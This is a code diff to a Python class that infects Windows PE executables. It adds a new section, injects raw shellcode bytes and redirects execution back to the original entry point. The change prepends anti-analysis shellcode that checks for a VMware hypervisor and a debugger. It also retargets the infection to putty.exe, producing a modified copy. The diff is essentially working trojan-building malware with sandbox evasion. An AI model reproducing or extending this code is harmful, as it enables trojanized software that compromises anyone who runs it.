@@ -47,18 +47,22 @@ class PeInfection:
         self.pe.OPTIONAL_HEADER.SizeOfImage = self.virtual_size + self.virtual_offset
         self.pe.write(self.infected_file_name)
 
+    def get_relative_to_ep(self, current_address):
+        return struct.pack(
+            "<i", self.pe.OPTIONAL_HEADER.AddressOfEntryPoint - current_address
+        )
+
     def infect(self, shellcode):
         self.add_section()
 
-        return_ep = struct.pack(
-            "<i",
-            self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
-            - self.virtual_offset
-            - len(shellcode)
-            - 5,
-        )
+        anti_shellcode = b"\x31\xc0\x40\x0f\xa2\x0f\xba\xe1\x1f\x72\x19\x31\xc0\xb8\x00\x00\x00\x40\x0f\xa2\x81\xf9\x72\x65\x56\x4d\x75\x0f\x81\xfa\x77\x61\x72\x65\x75\x07\xb8\x01\x00\x00\x00\xeb\x05\xb8\x00\x00\x00\x00\x83\xf8\x01\x74\x11\x64\x8b\x1d\x30\x00\x00\x00\x31\xc0\x8a\x43\x02\x83\xf8\x00\x74\x05"
+        # anti_shellcode += b"\x83\xf8\x01"
+        anti_shellcode += b"\xe9" + struct.pack("<i", len(shellcode))
+        shellcode = anti_shellcode + shellcode
 
-        return_code = b"\xE9" + return_ep
+        return_code = b"\xE9" + self.get_relative_to_ep(
+            self.virtual_offset + len(shellcode) + 5
+        )
 
         # Add file size
         ORIGINAL_SIZE = path.getsize(self.infected_file_name)
@@ -75,11 +79,10 @@ class PeInfection:
         infectpe.write(self.infected_file_name)
 
 
-filename = path.join(path.dirname(__file__), "test/mingw-get-setup.exe")
-infected_file_name = path.join(path.dirname(__file__), "test/mingw-get-setup-moded.exe")
+filename = path.join(path.dirname(__file__), "test/putty.exe")
+infected_file_name = path.join(path.dirname(__file__), "test/putty-moded.exe")
 
-buf = b""
-buf += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
+buf = b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
 buf += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
 buf += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
 buf += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
